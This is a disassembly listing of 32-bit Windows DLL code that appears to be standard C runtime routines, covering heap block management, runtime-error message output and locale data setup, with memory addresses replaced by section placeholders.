mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_10013210
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10012e27
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_10012d77
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_100134f5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_1001a09e
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_1001a09e
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_1000b9b0
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_1001479b
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
push esi
call sub_1000b9b0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_1001479b
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_1000b9b0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_100146e6
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_1001462a
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_10019f35
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e74b
add esp 0x14
push r--data
push ebx
push edi
call sub_1001462a
add esp 0xc
test eax eax
je r-xdata
sub_100136a0
push 0x3
call sub_1001a09e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100134f5
push 0xff
call sub_100134f5
pop ecx
pop ecx
push 0x3
call sub_1001a09e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100136d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
movzx ecx [ eax + 0x42 ]
movzx edx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
test esi esi
jne r-xdata
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ecx
xor ebx ebx
inc ebx
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
push esi
push 0x37
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push [ ebp - 0x4 ]
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_10019878
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
mov ebx [ ebp - 0x8 ]
push ebx
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_10019878
add esp 0x50
or edi eax
mov eax edi
pop edi
mov [ esi + 0xac ] ebx
pop ebx
leave
retn
or eax 0xffffffff
leave
retn
sub_10013af4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_1000bf59
push [ esi + 0x8 ]
call sub_1000bf59
push [ esi + 0xc ]
call sub_1000bf59
push [ esi + 0x10 ]
call sub_1000bf59
push [ esi + 0x14 ]
call sub_1000bf59
push [ esi + 0x18 ]
call sub_1000bf59
push [ esi ]
call sub_1000bf59
push [ esi + 0x20 ]
call sub_1000bf59
push [ esi + 0x24 ]
call sub_1000bf59
push [ esi + 0x28 ]
call sub_1000bf59
push [ esi + 0x2c ]
call sub_1000bf59
push [ esi + 0x30 ]
call sub_1000bf59
push [ esi + 0x34 ]
call sub_1000bf59
push [ esi + 0x1c ]
call sub_1000bf59
push [ esi + 0x38 ]
call sub_1000bf59
push [ esi + 0x3c ]
call sub_1000bf59
add esp 0x40
push [ esi + 0x40 ]
call sub_1000bf59
push [ esi + 0x44 ]
call sub_1000bf59
push [ esi + 0x48 ]
call sub_1000bf59
push [ esi + 0x4c ]
call sub_1000bf59
push [ esi + 0x50 ]
call sub_1000bf59
push [ esi + 0x54 ]
call sub_1000bf59
push [ esi + 0x58 ]
call sub_1000bf59
push [ esi + 0x5c ]
call sub_1000bf59
push [ esi + 0x60 ]
call sub_1000bf59
push [ esi + 0x64 ]
call sub_1000bf59
push [ esi + 0x68 ]
call sub_1000bf59
push [ esi + 0x6c ]
call sub_1000bf59
push [ esi + 0x70 ]
call sub_1000bf59
push [ esi + 0x74 ]
call sub_1000bf59
push [ esi + 0x78 ]
call sub_1000bf59
push [ esi + 0x7c ]
call sub_1000bf59
add esp 0x40
push [ esi + 0x80 ]
call sub_1000bf59
push [ esi + 0x84 ]
call sub_1000bf59
push [ esi + 0x88 ]
call sub_1000bf59
push [ esi + 0x8c ]
call sub_1000bf59
push [ esi + 0x90 ]
call sub_1000bf59
push [ esi + 0x94 ]
call sub_1000bf59
push [ esi + 0x98 ]
call sub_1000bf59
push [ esi + 0x9c ]
call sub_1000bf59
push [ esi + 0xa0 ]
call sub_1000bf59
push [ esi + 0xa4 ]
call sub_1000bf59
push [ esi + 0xa8 ]
call sub_1000bf59
add esp 0x2c
sub_10013c89
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x20 ] 0x0
mov ebx rw-data
je r-xdata
mov esi ebx
push 0xb8
push 0x1
call sub_10011a2a
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi ] esi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax edi
call sub_100136d9
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ esi + 0xb4 ] 0x1
jmp r-xdata
push esi
call sub_10013af4
push esi
call sub_1000bf59
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add edi 0xd4
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_10013d02
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1000bf59
pop ecx
push esi
call sub_1000bf59
pop ecx
sub_10013d47
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
cmp [ ebx + 0x1c ] esi
jne r-xdata
push 0x30
push 0x1
call sub_10011a2a
mov edi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
cmp [ ebx + 0x18 ] esi
jne r-xdata
mov esi [ ebx + 0xbc ]
push 0xc
pop ecx
push 0x4
[ edi ] [ esi ]
call sub_100119e5
xor esi esi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x8 ] rw-data
jmp r-xdata
mov [ eax ] esi
cmp [ ebx + 0x1c ] esi
je r-xdata
push [ ebp + 0x8 ]
call sub_1000bf59
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0xb4 ]
mov esi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] esi
mov [ eax + 0x8 ] ecx
push 0x4
call sub_100119e5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
push eax
call esi
mov [ eax ] ecx
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
movzx edi [ ebx + 0x3e ]
push esi
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10019878
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10019878
or [ ebp - 0xc ] eax
lea eax [ esi + 0x8 ]
push eax
push 0x10
push edi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10019878
add esp 0x3c
or eax [ ebp - 0xc ]
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xbc ] eax
xor eax eax
push eax
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
